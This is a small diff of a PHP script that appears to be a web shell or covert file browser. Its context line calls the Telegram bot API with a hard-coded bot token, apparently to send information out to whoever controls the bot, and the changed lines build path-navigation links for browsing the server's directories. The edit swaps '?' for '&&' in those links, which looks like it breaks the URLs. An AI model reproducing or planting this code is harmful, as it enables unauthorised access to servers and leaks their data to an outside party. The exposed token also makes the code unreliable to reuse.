@@ -19,11 +19,11 @@ file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAd
       foreach($paths as $id=>$pat){
          if($pat == '' && $id == 0){
             $a = true;
-            echo '<a href="?action=start&&path=/">/</a>';
+            echo '<a href="&&action=start&&path=/">/</a>';
             continue;
          }
          if($pat == '') continue;
-         echo '<a href="?action=start&&path=';
+         echo '<a href="&&action=start&&path=';
          for($i=0;$i<=$id;$i++){
             echo "$paths[$i]";
             if($i != $id) echo "/";
